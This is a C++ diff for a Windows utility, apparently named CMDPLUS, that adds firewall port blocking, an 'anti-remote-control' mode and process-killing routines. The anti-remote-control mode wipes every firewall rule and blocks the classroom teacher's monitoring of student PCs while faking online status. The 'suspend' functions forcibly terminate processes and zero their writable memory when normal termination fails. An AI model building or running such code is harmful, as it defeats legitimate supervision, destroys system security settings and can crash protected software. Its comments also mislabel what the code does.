+        std::wstring ruleNameOut = GetRulePrefix() + L"UDP_OUT_" + std::to_wstring(port);
+        
+        bool blockedIn = false;
+        bool blockedOut = false;
+
+        if (!IsRuleExists(ruleNameIn)) {
+            std::wstring cmd = L"netsh advfirewall firewall add rule name=\"" + ruleNameIn +
+                              L"\" dir=in action=block protocol=UDP localport=" +
+                              std::to_wstring(port) + L" >nul 2>&1";
+            
+            if (_wsystem(cmd.c_str()) == 0) {
+                blockedIn = true;
+            }
+        } else {
+            std::wcout << L"  [已存在] UDP端口 " << port << L" 入站规则已存在" << std::endl;
+            blockedIn = true;
+        }
+
+        if (!IsRuleExists(ruleNameOut)) {
+            std::wstring cmd = L"netsh advfirewall firewall add rule name=\"" + ruleNameOut +
+                              L"\" dir=out action=block protocol=UDP localport=" +
+                              std::to_wstring(port) + L" >nul 2>&1";
+            
+            if (_wsystem(cmd.c_str()) == 0) {
+                blockedOut = true;
+            }
+        } else {
+            std::wcout << L"  [已存在] UDP端口 " << port << L" 出站规则已存在" << std::endl;
+            blockedOut = true;
+        }
+
+        if (blockedIn && blockedOut) {
+            std::wcout << L"  [成功] 已阻止UDP端口 " << port << L" 的入站和出站连接" << std::endl;
+        } else if (blockedIn) {
+            std::wcout << L"  [部分成功] 仅阻止了UDP端口 " << port << L" 的入站连接" << std::endl;
+        } else if (blockedOut) {
+            std::wcout << L"  [部分成功] 仅阻止了UDP端口 " << port << L" 的出站连接" << std::endl;
+        } else {
+            std::wcout << L"  [失败] 无法阻止UDP端口 " << port << std::endl;
+        }
+    }
+
+    static void UnBlockPortTCP(DWORD port) {
+        DeleteRule(GetRulePrefix() + L"TCP_IN_" + std::to_wstring(port));
+        DeleteRule(GetRulePrefix() + L"TCP_OUT_" + std::to_wstring(port));
+        std::wcout << L"  [完成] 已解除TCP端口 " << port << L" 的所有阻止规则（入站+出站）" << std::endl;
+    }
+
+    static void UnBlockPortUDP(DWORD port) {
+        DeleteRule(GetRulePrefix() + L"UDP_IN_" + std::to_wstring(port));
+        DeleteRule(GetRulePrefix() + L"UDP_OUT_" + std::to_wstring(port));
+        std::wcout << L"  [完成] 已解除UDP端口 " << port << L" 的所有阻止规则（入站+出站）" << std::endl;
+    }
+
+public:
+    static void ShowMenu() {
+        while (true) {
+            std::wcout << L"\n========================================" << std::endl;
+            std::wcout << L"       端口阻止管理" << std::endl;
+            std::wcout << L"========================================" << std::endl;
+            std::wcout << L"  1. 阻止单个端口（TCP+UDP）" << std::endl;
+            std::wcout << L"  2. 阻止端口范围" << std::endl;
+            std::wcout << L"  3. 仅阻止TCP端口" << std::endl;
+            std::wcout << L" 4. 仅阻止UDP端口" << std::endl;
+            std::wcout << L"  5. 解除端口阻止" << std::endl;
+            std::wcout << L"  6. 查看当前阻止的端口列表" << std::endl;
+            std::wcout << L"  7. 清除所有端口阻止规则" << std::endl;
+            std::wcout << L"  0. 返回主菜单" << std::endl;
+            std::wcout << L"\n请选择操作: ";
+
+            int choice;
+            std::wcin >> choice;
+            std::wcin.ignore();
+
+            switch (choice) {
+            case 1:
+                BlockSinglePort();
+                break;
+            case 2:
+                BlockPortRange();
+                break;
+            case 3:
+                BlockTCPPortOnly();
+                break;
+            case 4:
+                BlockUDPPortOnly();
+                break;
+            case 5:
+                UnblockPort();
+                break;
+            case 6:
+                ShowBlockedPorts();
+                break;
+            case 7:
+                ClearAllRules();
+                break;
+            case 0:
+                return;
+            default:
+                std::wcout << L"[错误] 无效选择" << std::endl;
+                break;
+            }
+        }
+    }
+
+    static void BlockSinglePort() {
+        std::wcout << L"\n请输入要阻止的端口号: ";
+        DWORD port;
+        std::wcin >> port;
+        std::wcin.ignore();
+
+        if (port < 1 || port > 65535) {
+            std::wcout << L"[错误] 无效的端口号 (1-65535)" << std::endl;
+            return;
+        }
+
+        std::wcout << L"\n正在阻止端口 " << port << L"..." << std::endl;
+        BlockPortTCP(port);
+        BlockPortUDP(port);
+    }
+
+    static void BlockPortRange() {
+        std::wcout << L"\n请输入起始端口号: ";
+        DWORD startPort, endPort;
+        std::wcin >> startPort;
+        std::wcin.ignore();
+
+        std::wcout << L"请输入结束端口号: ";
+        std::wcin >> endPort;
+        std::wcin.ignore();
+
+        if (startPort < 1 || endPort > 65535 || startPort > endPort) {
+            std::wcout << L"[错误] 无效的端口范围 (1-65535)" << std::endl;
+            return;
+        }
+
+        std::wcout << L"\n正在阻止端口范围 " << startPort << L"-" << endPort << L"..." << std::endl;
+
+        std::vector<std::wstring> commands;
+        
+        for (DWORD port = startPort; port <= endPort; port++) {
+            commands.push_back(L"netsh advfirewall firewall add rule name=\"" + GetRulePrefix() + L"TCP_IN_" + std::to_wstring(port) +
+                              L"\" dir=in action=block protocol=TCP localport=" + std::to_wstring(port));
+            commands.push_back(L"netsh advfirewall firewall add rule name=\"" + GetRulePrefix() + L"TCP_OUT_" + std::to_wstring(port) +
+                              L"\" dir=out action=block protocol=TCP localport=" + std::to_wstring(port));
+            commands.push_back(L"netsh advfirewall firewall add rule name=\"" + GetRulePrefix() + L"UDP_IN_" + std::to_wstring(port) +
+                              L"\" dir=in action=block protocol=UDP localport=" + std::to_wstring(port));
+            commands.push_back(L"netsh advfirewall firewall add rule name=\"" + GetRulePrefix() + L"UDP_OUT_" + std::to_wstring(port) +
+                              L"\" dir=out action=block protocol=UDP localport=" + std::to_wstring(port));
+        }
+
+        DWORD startTime = GetTickCount();
+        ExecuteBatchCommands(commands);
+        DWORD elapsed = GetTickCount() - startTime;
+
+        int count = (endPort - startPort + 1);
+        std::wcout << L"\n[完成] 共阻止了 " << count << L" 个端口 (" << elapsed << L"ms)" << std::endl;
+    }
+
+    static void BlockTCPPortOnly() {
+        std::wcout << L"\n请输入要阻止的TCP端口号: ";
+        DWORD port;
+        std::wcin >> port;
+        std::wcin.ignore();
+
+        if (port < 1 || port > 65535) {
+            std::wcout << L"[错误] 无效的端口号 (1-65535)" << std::endl;
+            return;
+        }
+
+        BlockPortTCP(port);
+    }
+
+    static void BlockUDPPortOnly() {
+        std::wcout << L"\n请输入要阻止的UDP端口号: ";
+        DWORD port;
+        std::wcin >> port;
+        std::wcin.ignore();
+
+        if (port < 1 || port > 65535) {
+            std::wcout << L"[错误] 无效的端口号 (1-65535)" << std::endl;
+            return;
+        }
+
+        BlockPortUDP(port);
+    }
+
+    static void UnblockPort() {
+        std::wcout << L"\n请输入要解除阻止的端口号: ";
+        DWORD port;
+        std::wcin >> port;
+        std::wcin.ignore();
+
+        if (port < 1 || port > 65535) {
+            std::wcout << L"[错误] 无效的端口号 (1-65535)" << std::endl;
+            return;
+        }
+
+        UnBlockPortTCP(port);
+        UnBlockPortUDP(port);
+    }
+
+    static void ShowBlockedPorts() {
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       当前阻止的端口列表" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+
+        FILE* pipe = _wpopen(L"netsh advfirewall firewall show rule name=all", L"r");
+        if (!pipe) {
+            std::wcout << L"[错误] 无法获取防火墙规则列表" << std::endl;
+            return;
+        }
+
+        wchar_t buffer[1024];
+        bool foundAny = false;
+
+        while (fgetws(buffer, sizeof(buffer) / sizeof(wchar_t), pipe)) {
+            std::wstring line(buffer);
+            
+            if (line.find(GetRulePrefix()) != std::wstring::npos) {
+                foundAny = true;
+                
+                size_t pos = line.find(L"规则名称:");
+                if (pos == std::wstring::npos) continue;
+
+                size_t nameStart = line.find_first_not_of(L" \t", pos + wcslen(L"规则名称:"));
+                if (nameStart == std::wstring::npos) continue;
+
+                size_t nameEnd = line.find_last_not_of(L" \t\r\n");
+                if (nameEnd == std::wstring::npos) continue;
+
+                std::wstring ruleName = line.substr(nameStart, nameEnd - nameStart + 1);
+
+                if (ruleName.find(GetRulePrefix()) == 0 && 
+                    ruleName.length() > GetRulePrefix().length()) {
+                    
+                    std::wstring portInfo = ruleName.substr(GetRulePrefix().length());
+                    
+                    std::wcout << L"  " << ruleName << std::endl;
+                }
+            }
+        }
+
+        _pclose(pipe);
+
+        if (!foundAny) {
+            std::wcout << L"  [信息] 当前没有阻止任何端口" << std::endl;
+        }
+    }
+
+    static void ClearAllRules() {
+        std::wcout << L"\n确定要清除所有端口阻止规则吗？(y/n): ";
+        wchar_t confirm;
+        std::wcin >> confirm;
+        std::wcin.ignore();
+
+        if (confirm == L'y' || confirm == L'Y') {
+            FILE* pipe = _wpopen(L"netsh advfirewall firewall show rule name=all", L"r");
+            if (!pipe) {
+                std::wcout << L"[错误] 无法获取防火墙规则列表" << std::endl;
+                return;
+            }
+
+            wchar_t buffer[1024];
+            int deletedCount = 0;
+
+            while (fgetws(buffer, sizeof(buffer) / sizeof(wchar_t), pipe)) {
+                std::wstring line(buffer);
+
+                if (line.find(GetRulePrefix()) != std::wstring::npos) {
+                    size_t pos = line.find(L"规则名称:");
+                    if (pos == std::wstring::npos) continue;
+
+                    size_t nameStart = line.find_first_not_of(L" \t", pos + wcslen(L"规则名称:"));
+                    if (nameStart == std::wstring::npos) continue;
+
+                    size_t nameEnd = line.find_last_not_of(L" \t\r\n");
+                    if (nameEnd == std::wstring::npos) continue;
+
+                    std::wstring ruleName = line.substr(nameStart, nameEnd - nameStart + 1);
+
+                    if (ruleName.find(GetRulePrefix()) == 0) {
+                        DeleteRule(ruleName);
+                        deletedCount++;
+                    }
+                }
+            }
+
+            _pclose(pipe);
+
+            std::wcout << L"\n[完成] 已清除 " << deletedCount << L" 个端口阻止规则" << std::endl;
+        } else {
+            std::wcout << L"[取消] 操作已取消" << std::endl;
+        }
+    }
+};
+
+// ============================================================================
+// 反远程控制防火墙模块 - 阻止教师机对学生电脑的远程控制
+// ============================================================================
+
+class AntiRemoteControl {
+private:
+    static std::wstring GetFirewallRulePrefix() {
+        return L"CMDPLUS_ANTI_REMOTE_";
+    }
+
+    static bool IsFirewallRuleExists(const std::wstring& ruleName) {
+        std::wstring cmd = L"netsh advfirewall firewall show rule name=\"" + ruleName + L"\" >nul 2>&1";
+        return _wsystem(cmd.c_str()) == 0;
+    }
+
+    static void DeleteFirewallRule(const std::wstring& ruleName) {
+        if (!IsFirewallRuleExists(ruleName)) {
+            return;
+        }
+        std::wstring cmd = L"netsh advfirewall firewall delete rule name=\"" + ruleName + L"\" >nul 2>&1";
+        _wsystem(cmd.c_str());
+    }
+
+    static void DeleteAllRules() {
+        _wsystem(L"netsh advfirewall firewall delete rule name=all >nul 2>&1");
+        std::wcout << L"  [完成] 已重置防火墙规则" << std::endl;
+    }
+
+    static void ExecuteFirewallCommands(const std::vector<std::wstring>& commands) {
+        DMSP_VERIFY(0x2008);  // 防火墙命令执行子函数 - 二级验证
+        if (commands.empty()) return;
+
+        std::wstring batchContent;
+        for (const auto& cmd : commands) {
+            batchContent += cmd + L"\r\n";
+        }
+
+        wchar_t tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        
+        std::wstring batchFile = std::wstring(tempPath) + L"CMDPLUS_FW_";
+        
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        batchFile += std::to_wstring(st.wYear) + std::to_wstring(st.wMonth) +
+                    std::to_wstring(st.wDay) + std::to_wstring(st.wHour) +
+                    std::to_wstring(st.wMinute) + std::to_wstring(st.wSecond) +
+                    std::to_wstring(st.wMilliseconds) + L".bat";
+
+        FILE* f = _wfopen(batchFile.c_str(), L"w");
+        if (!f) return;
+        
+        fwprintf(f, L"@echo off\r\n");
+        fwprintf(f, L"%s", batchContent.c_str());
+        fclose(f);
+
+        STARTUPINFOW si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi;
+
+        std::wstring cmdLine = L"cmd.exe /c \"" + batchFile + L"\" >nul 2>&1";
+        
+        if (CreateProcessW(NULL, &cmdLine[0], NULL, NULL, FALSE,
+                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
+
+        _wremove(batchFile.c_str());
+    }
+
+public:
+    static void EnableAntiRemoteControl() {
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       反远程控制防火墙规则" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+
+        std::wcout << L"\n正在配置防火墙..." << std::endl;
+
+        std::vector<std::wstring> commands;
+
+        commands.push_back(L"netsh advfirewall firewall delete rule name=all");
+        commands.push_back(L"netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound");
+        commands.push_back(L"netsh advfirewall set allprofiles state on");
+
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_HTTP_IN\" dir=in action=allow protocol=TCP localport=80 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_HTTP_OUT\" dir=out action=allow protocol=TCP remoteport=80 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_HTTPS_IN\" dir=in action=allow protocol=TCP localport=443 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_HTTPS_OUT\" dir=out action=allow protocol=TCP remoteport=443 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_DNS_IN\" dir=in action=allow protocol=UDP localport=53 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_DNS_OUT\" dir=out action=allow protocol=UDP remoteport=53 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_DHCP_IN\" dir=in action=allow protocol=UDP localport=67,68 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_DHCP_OUT\" dir=out action=allow protocol=UDP remoteport=67,68 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_ICMP\" dir=in action=allow protocol=ICMPv4 any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_ICMP_OUT\" dir=out action=allow protocol=ICMPv4 any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_LOOPBACK\" dir=in action=allow localip=127.0.0.1 remoteip=127.0.0.1");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_LOOPBACK_OUT\" dir=out action=allow localip=127.0.0.1 remoteip=127.0.0.1");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_NETBIOS_IN\" dir=in action=allow protocol=UDP localport=137,138,139 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_NETBIOS_OUT\" dir=out action=allow protocol=UDP remoteport=137,138,139 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_NETBIOS_TCP_IN\" dir=in action=allow protocol=TCP localport=445 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_NETBIOS_TCP_OUT\" dir=out action=allow protocol=TCP remoteport=445 profile=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_ARP\" dir=in action=allow protocol=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_ARP_OUT\" dir=out action=allow protocol=any");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_LAN_BROADCAST_IN\" dir=in action=allow protocol=UDP localip=255.255.255.255");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_LAN_BROADCAST_OUT\" dir=out action=allow protocol=UDP remoteip=255.255.255.255");
+
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_GAME_TCP_IN\" dir=in action=allow protocol=TCP localport=27015-27030,7777-7780,28960,25565 >nul 2>&1");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_GAME_TCP_OUT\" dir=out action=allow protocol=TCP remoteport=27015-27030,7777-7780,28960,25565 >nul 2>&1");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_GAME_UDP_IN\" dir=in action=allow protocol=UDP localport=27015-27030,7777-7780,28960,25565 >nul 2>&1");
+        commands.push_back(L"netsh advfirewall firewall add rule name=\"ALLOW_GAME_UDP_OUT\" dir=out action=allow protocol=UDP remoteport=27015-27030,7777-7780,28960,25565 >nul 2>&1");
+
+        commands.push_back(L"netsh qos set policy name=\"CMDPLUS_BCAST_LIMIT\" 1 -p both -d 127.0.0.0 netmask 0.0.0.0 -b 101376 >nul 2>&1");
+        commands.push_back(L"netsh qos set policy name=\"CMDPLUS_NETBIOS_LIMIT\" 1 -p both -d 0.0.0.0 netmask 255.255.255.255 -b 101376 >nul 2>&1");
+        commands.push_back(L"netsh qos set policy name=\"CMDPLUS_ICMP_LIMIT\" 1 -p both -d 0.0.0.0 netmask 255.255.255.255 -b 101376 >nul 2>&1");
+
+        DWORD startTime = GetTickCount();
+        ExecuteFirewallCommands(commands);
+        DWORD elapsed = GetTickCount() - startTime;
+
+        std::wcout << L"\n[完成] 反远程控制防火墙规则已启用! (" << elapsed << L"ms)" << std::endl;
+        std::wcout << L"\n说明:" << std::endl;
+        std::wcout << L"  [+] 已设置默认策略: 阻止所有入站+出站连接" << std::endl;
+        std::wcout << L"  [+] 允许(不限速): HTTP(80), HTTPS(443) 用于正常上网" << std::endl;
+        std::wcout << L"  [+] 允许(不限速): DNS(53), DHCP(67,68) 用于网络基础服务" << std::endl;
+        std::wcout << L"  [+] 允许(不限速): 游戏端口 (CS/Quake/Minecraft等)" << std::endl;
+        std::wcout << L"  [+] 允许(限速99KB/S): ICMP(Ping), NetBIOS, 局域网广播" << std::endl;
+        std::wcout << L"  [-] 阻止: 所有其他网络连接（包括远程控制）" << std::endl;
+        std::wcout << L"\n效果:" << std::endl;
+        std::wcout << L"  - 学生电脑可以正常浏览网页" << std::endl;
+        std::wcout << L"  - 教师端无法查看/控制学生屏幕" << std::endl;
+        std::wcout << L"  - 教师端应能看到学生在线（通过NetBIOS/Ping/广播检测）" << std::endl;
+        std::wcout << L"\n如果教师端仍显示离线:" << std::endl;
+        std::wcout << L"  1. 使用功能12(端口监控)检测教师端尝试连接的端口" << std::endl;
+        std::wcout << L"  2. 使用功能13(端口阻止)手动允许该端口" << std::endl;
+    }
+
+    static void DisableAntiRemoteControl() {
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       删除反远程控制防火墙规则" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+
+        std::wcout << L"\n正在重置防火墙..." << std::endl;
+
+        std::vector<std::wstring> commands;
+        commands.push_back(L"netsh advfirewall firewall delete rule name=all");
+        commands.push_back(L"netsh advfirewall set allprofiles firewallpolicy inboundallow,outboundallow");
+        commands.push_back(L"netsh advfirewall set allprofiles state on");
+        commands.push_back(L"netsh qos delete policy name=\"CMDPLUS_BCAST_LIMIT\" >nul 2>&1");
+        commands.push_back(L"netsh qos delete policy name=\"CMDPLUS_NETBIOS_LIMIT\" >nul 2>&1");
+        commands.push_back(L"netsh qos delete policy name=\"CMDPLUS_ICMP_LIMIT\" >nul 2>&1");
+
+        DWORD startTime = GetTickCount();
+        ExecuteFirewallCommands(commands);
+        DWORD elapsed = GetTickCount() - startTime;
+
+        std::wcout << L"\n[完成] 防火墙已恢复默认设置! (" << elapsed << L"ms)" << std::endl;
+    }
+
+    static void ShowStatus() {
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       反远程控制防火墙规则状态" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+
+        bool allowHttp = IsFirewallRuleExists(L"ALLOW_HTTP_IN");
+        bool allowHttps = IsFirewallRuleExists(L"ALLOW_HTTPS_IN");
+        bool allowDns = IsFirewallRuleExists(L"ALLOW_DNS_IN");
+
+        if (allowHttp && allowHttps && allowDns) {
+            std::wcout << L"  [启用] 防火墙保护已激活 - 默认阻止所有连接" << std::endl;
+            std::wcout << L"  [启用] 允许HTTP/HTTPS/DNS上网" << std::endl;
+        } else {
+            std::wcout << L"  [禁用] 防火墙保护未激活" << std::endl;
+        }
+    }
+
+    static void ShowMenu() {
+        while (true) {
+            std::wcout << L"\n========================================" << std::endl;
+            std::wcout << L"       反远程控制防火墙" << std::endl;
+            std::wcout << L"========================================" << std::endl;
+            std::wcout << L"  1. 启用反远程控制规则" << std::endl;
+            std::wcout << L"  2. 禁用反远程控制规则" << std::endl;
+            std::wcout << L"  3. 查看规则状态" << std::endl;
+            std::wcout << L"  0. 返回" << std::endl;
+            std::wcout << L"\n请选择操作: ";
+
+            int choice;
+            std::wcin >> choice;
+            std::wcin.ignore();
+
+            switch (choice) {
+            case 1:
+                EnableAntiRemoteControl();
+                break;
+            case 2:
+                DisableAntiRemoteControl();
+                break;
+            case 3:
+                ShowStatus();
+                break;
+            case 0:
+                return;
+            default:
+                std::wcout << L"[错误] 无效选择" << std::endl;
+                break;
+            }
+        }
+    }
+};
+
+// 挂起指定名称的进程及其所有子进程
+void GQ(const std::string& processName) {
+    std::wstring wideProcessName = NarrowToWide(processName);
+    std::set<DWORD> targetPids;
+
+    ProcessTerminator::initNativeAPI();
+    ProcessTerminator::EnableAllPrivileges();
+
+    std::wcout << L"正在查找进程: " << wideProcessName.c_str() << std::endl;
+
+    HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0));
+    if (hSnapshot.get() == INVALID_HANDLE_VALUE) {
+        std::wcerr << L"创建进程快照失败: " << GetLastError() << std::endl;
+        return;
+    }
+
+    std::unordered_map<DWORD, std::vector<DWORD>> processTree;
+    std::unordered_map<DWORD, std::vector<DWORD>> threadMap;
+    PROCESSENTRY32W pe = { 0 };
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (Process32FirstW(hSnapshot.get(), &pe)) {
+        do {
+            processTree[pe.th32ParentProcessID].push_back(pe.th32ProcessID);
+
+            if (_wcsicmp(pe.szExeFile, wideProcessName.c_str()) == 0) {
+                targetPids.insert(pe.th32ProcessID);
+                std::wcout << L"发现目标进程: " << pe.szExeFile << L" (PID: " << pe.th32ProcessID << L")" << std::endl;
+            }
+        } while (Process32NextW(hSnapshot.get(), &pe));
+    }
+
+    THREADENTRY32 te = { 0 };
+    te.dwSize = sizeof(THREADENTRY32);
+    if (Thread32First(hSnapshot.get(), &te)) {
+        do {
+            threadMap[te.th32OwnerProcessID].push_back(te.th32ThreadID);
+        } while (Thread32Next(hSnapshot.get(), &te));
+    }
+
+    std::vector<DWORD> processQueue(targetPids.begin(), targetPids.end());
+    size_t currentIndex = 0;
+
+    while (currentIndex < processQueue.size()) {
+        DWORD currentPid = processQueue[currentIndex++];
+        auto it = processTree.find(currentPid);
+        if (it != processTree.end()) {
+            for (DWORD childPid : it->second) {
+                if (targetPids.insert(childPid).second) {
+                    processQueue.push_back(childPid);
+                    std::wcout << L"发现子进程: PID " << childPid << std::endl;
+                }
+            }
+        }
+    }
+
+    if (targetPids.empty()) {
+        std::wcout << L"未找到进程: " << wideProcessName.c_str() << std::endl;
+        return;
+    }
+
+    std::wcout << L"找到 " << targetPids.size() << L" 个目标进程/子进程" << std::endl;
+
+    for (DWORD pid : targetPids) {
+        HANDLE hProcess = NULL;
+        std::vector<HANDLE> openedHandles;
+
+        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (hProcess) {
+            openedHandles.push_back(hProcess);
+        }
+
+        if (!hProcess && ProcessTerminator::NtOpenProcess) {
+            CLIENT_ID clientId = { 0 };
+            OBJECT_ATTRIBUTES objAttr = { 0 };
+            clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+            NTSTATUS status = ProcessTerminator::NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+            if (NT_SUCCESS(status) && hProcess) {
+                openedHandles.push_back(hProcess);
+                std::wcout << L"NtOpenProcess成功" << std::endl;
+            }
+        }
+
+        if (!hProcess) {
+            HANDLE hSystemSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSystemSnapshot != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe2 = { sizeof(PROCESSENTRY32W) };
+                if (Process32FirstW(hSystemSnapshot, &pe2)) {
+                    do {
+                        if (pe2.th32ProcessID == pid) {
+                            HANDLE hSrcProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+                            if (hSrcProcess) {
+                                HANDLE hDupHandle = NULL;
+                                if (DuplicateHandle(hSrcProcess, reinterpret_cast<HANDLE>(static_cast<uintptr_t>(pid)),
+                                    GetCurrentProcess(), &hDupHandle,
+                                    PROCESS_ALL_ACCESS, FALSE, 0)) {
+                                    openedHandles.push_back(hDupHandle);
+                                    std::wcout << L"DuplicateHandle成功" << std::endl;
+                                }
+                                CloseHandle(hSrcProcess);
+                            }
+                            break;
+                        }
+                    } while (Process32NextW(hSystemSnapshot, &pe2));
+                }
+                CloseHandle(hSystemSnapshot);
+            }
+        }
+
+        if (openedHandles.empty()) {
+            std::wcerr << L"无法打开进程" << pid << std::endl;
+            continue;
+        }
+
+        if (ProcessTerminator::NtSuspendProcess) {
+            for (DWORD threadId : threadMap[pid]) {
+                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
+                if (hThread) {
+                    ProcessTerminator::NtSuspendProcess(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+        }
+
+        bool terminated = false;
+        for (HANDLE hProc : openedHandles) {
+            if (ProcessTerminator::NtTerminateProcess) {
+                NTSTATUS status = ProcessTerminator::NtTerminateProcess(hProc, 1);
+                if (NT_SUCCESS(status)) {
+                    terminated = true;
+                    break;
+                }
+            }
+
+            if (TerminateProcess(hProc, 1)) {
+                terminated = true;
+                break;
+            }
+        }
+
+        if (!terminated) {
+            for (HANDLE hProc : openedHandles) {
+                MEMORY_BASIC_INFORMATION mbi;
+                LPVOID address = 0;
+
+                while (VirtualQueryEx(hProc, address, &mbi, sizeof(mbi))) {
+                    if (mbi.State == MEM_COMMIT &&
+                        (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
+                        std::vector<BYTE> zeros(mbi.RegionSize, 0);
+                        SIZE_T bytesWritten;
+                        WriteProcessMemory(hProc, mbi.BaseAddress, zeros.data(), mbi.RegionSize, &bytesWritten);
+                    }
+                    address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+                }
+            }
+            for (HANDLE hProc : openedHandles) {
+                if (ProcessTerminator::NtTerminateProcess) {
+                    NTSTATUS status = ProcessTerminator::NtTerminateProcess(hProc, 1);
+                    if (NT_SUCCESS(status)) {
+                        terminated = true;
+                        break;
+                    }
+                }
+
+                if (TerminateProcess(hProc, 1)) {
+                    terminated = true;
+                    break;
+                }
+            }
+        }
+
+        if (!terminated) {
+
+            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+            if (hNtdll) {
+                typedef NTSTATUS(NTAPI* _ZwTerminateProcess)(HANDLE, NTSTATUS);
+                _ZwTerminateProcess ZwTerminateProcess = (_ZwTerminateProcess)GetProcAddress(hNtdll, "ZwTerminateProcess");
+                if (ZwTerminateProcess) {
+                    for (HANDLE hProc : openedHandles) {
+                        NTSTATUS status = ZwTerminateProcess(hProc, 1);
+                        if (NT_SUCCESS(status)) {
+                            terminated = true;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        for (HANDLE hProc : openedHandles) {
+            if (hProc && hProc != INVALID_HANDLE_VALUE) {
+                CloseHandle(hProc);
+            }
+        }
+
+        if (terminated) {
+            std::wcout << L"PID " << pid << L" 已终止" << std::endl;
+        }
+        else {
+            std::wcerr << L"PID " << pid << L" 终止失败" << std::endl;
+        }
+    }
+
+    std::wcout << L"处理完成" << std::endl;
+}
+
+// 挂起多个指定名称的进程及其所有子进程
+void GQS(const std::vector<std::string>& processNames) {
+    std::wcout << L"开始批量处理 " << processNames.size() << L" 个进程" << std::endl;
+
+    std::set<DWORD> allTargetPids;
+    std::unordered_map<DWORD, std::vector<std::string>> processToNames;
+
+    ProcessTerminator::initNativeAPI();
+    ProcessTerminator::EnableAllPrivileges();
+
+    for (const auto& processName : processNames) {
+        std::wstring wideProcessName = NarrowToWide(processName);
+
+        HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0));
+        if (hSnapshot.get() == INVALID_HANDLE_VALUE) {
+            std::wcerr << L"创建快照失败: " << GetLastError() << std::endl;
+            continue;
+        }
+
+        PROCESSENTRY32W pe = { 0 };
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+
+        if (Process32FirstW(hSnapshot.get(), &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, wideProcessName.c_str()) == 0) {
+                    allTargetPids.insert(pe.th32ProcessID);
+                    processToNames[pe.th32ProcessID].push_back(processName);
+                    std::wcout << L"发现: " << wideProcessName.c_str() << L" (PID: " << pe.th32ProcessID << L")" << std::endl;
+                }
+            } while (Process32NextW(hSnapshot.get(), &pe));
+        }
+    }
+
+    if (allTargetPids.empty()) {
+        std::wcout << L"未找到任何目标进程" << std::endl;
+        return;
+    }
+
+    std::wcout << L"找到 " << allTargetPids.size() << L" 个目标进程" << std::endl;
+
+    std::vector<std::future<bool>> futures;
+
+    for (DWORD pid : allTargetPids) {
+        futures.push_back(std::async(std::launch::async, [pid, &processToNames]() -> bool {
+            HANDLE hProcess = NULL;
+            std::vector<HANDLE> openedHandles;
+            bool terminated = false;
+
+            std::wcout << L"处理 PID " << pid << std::endl;
+
+            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+            if (hProcess) {
+                openedHandles.push_back(hProcess);
+            }
+
+            if (!hProcess && ProcessTerminator::NtOpenProcess) {
